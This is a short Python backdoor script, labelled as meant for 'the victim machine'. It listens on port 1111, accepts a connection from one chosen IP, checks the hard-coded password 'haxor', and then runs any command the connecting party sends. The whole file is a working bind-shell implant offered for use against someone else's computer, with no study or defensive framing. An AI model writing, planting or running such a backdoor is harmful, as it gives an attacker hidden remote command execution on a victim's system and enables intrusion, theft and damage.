# this is for the victim machine
import sys
import subprocess
import socket
import shlex

CLIENT_IP = sys.argv[1] 
PORT = 1111

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("", PORT))

s.listen(2)
while True:
    conn, address = s.accept()
    print("Incoming connection: " + str(address))
    if address[0] == CLIENT_IP:
        pwd = conn.recv(4096).decode()
        if pwd == "haxor":
            print("Correct password, waiting for commands")
            conn.send("authenticated".encode())
            while True:
                data = conn.recv(4096).decode()
                if not data:
                    break
                subprocess.run(shlex.split(str(data)))
        else:
            print("Incorrect password")

conn.close()